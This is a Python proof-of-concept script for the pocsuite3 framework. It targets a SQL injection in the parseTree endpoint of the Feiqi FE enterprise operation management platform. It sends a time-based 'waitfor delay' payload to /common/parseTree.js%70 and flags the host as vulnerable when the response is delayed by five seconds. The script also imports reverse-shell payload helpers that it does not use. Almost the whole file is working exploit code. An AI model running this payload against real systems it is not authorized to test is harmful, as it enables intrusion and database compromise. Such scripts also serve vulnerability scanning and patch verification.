# _*_ coding:utf-8 _*_
# @Time : 2024/2/23
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class feiqi_parsetree_sql(POCBase):
    pocDesc = '''飞企互联-FE企业运营管理平台-parsetree接口存在SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-23'
    name = '飞企互联-FE企业运营管理平台-parsetree接口存在SQL注入漏洞'
    #app="飞企互联-FE企业运营管理平台"


    def _verify(self):

        result = {}
        url = self.url+ ' /common/parseTree.js%70?code=1%27;waitfor+delay+%270:0:5%27--'

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }

        try:

            response = requests.get(url, headers=headers)
            if response.status_code == 200  and response.elapsed.total_seconds() >= 5:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(feiqi_parsetree_sql)